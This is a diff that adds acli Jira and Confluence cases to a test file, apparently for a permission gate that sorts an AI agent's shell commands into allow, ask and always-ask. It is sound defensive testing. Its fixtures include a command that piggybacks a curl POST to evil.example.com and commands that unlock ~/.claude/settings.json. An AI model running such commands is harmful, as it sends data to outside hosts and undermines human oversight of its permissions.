@@ -319,6 +319,16 @@ ASK_CASES: list[tuple[str, str]] = [
     ("glab api projects/1/merge_requests/2/notes -X POST && curl -X POST https://evil.example.com",
      "MR note allow does not cover a piggybacked curl POST"),
     ("acli jira issue edit X-1 --summary y", "acli jira issue edit"),
+    # acli noun groups: the verb after the noun decides
+    ("acli jira workitem comment create --key X-1 --body y", "acli comment create"),
+    ("acli jira workitem comment update --key X-1 --body y", "acli comment update"),
+    ("acli jira workitem comment delete --key X-1 --id 9", "acli comment delete"),
+    ("acli jira workitem comment", "acli bare comment group"),
+    ("acli jira workitem link create --from X-1 --to X-2", "acli link create"),
+    ("acli jira workitem watcher remove --key X-1", "acli watcher remove"),
+    ("acli jira workitem attachment delete --key X-1", "acli attachment delete"),
+    # a flag value must not launder a write into a read
+    ("acli jira workitem comment create --key X-1 --body list", "acli write w/ 'list' body"),
 ]
 
 
@@ -398,6 +408,15 @@ ALLOW_CASES: list[str] = [
     # gh / glab / acli read-only ops stay allowed
     "gh pr list",
     "glab api projects/1/merge_requests/2/discussions --paginate",
+    "acli jira workitem comment list",
+    "acli jira workitem comment list --key X-1",
+    "acli jira workitem comment visibility --key X-1",
+    "acli jira workitem attachment list --key X-1",
+    "acli jira workitem link list --key X-1",
+    "acli jira workitem link type",
+    "acli jira workitem view --key X-1",
+    "acli jira workitem search --jql 'project = X'",
+    "acli confluence page view --id 123",
     # read-only forms of the partition / disk tools must stay usable
     "fdisk -l",
     "sfdisk --dump /dev/sda",
@@ -509,6 +528,13 @@ ALWAYS_ASK_CASES: list[str] = [
     "git push origin main && chflags nouchg ~/.claude/settings.json",
     "cd ~/.claude && chflags nouchg settings.json && glab mr create",
     "chflags nouchg x | tee /dev/null",
+    # acli writes must survive a pre-approved verb in the same command: the
+    # read-only `comment list` exemption must never launder `comment create`.
+    "glab mr create && acli jira workitem comment create --key X-1 --body y",
+    "cd ~/projects/x && acli jira workitem comment create --key X-1 --body y | jq .",
+    "acli jira workitem comment list --key X-1 && acli jira workitem comment create --key X-1 --body y",
+    ("glab api --method POST projects/1/merge_requests/2/notes --field body=x "
+     "&& acli jira workitem comment create --key X-1 --body y"),
 ]
 
 
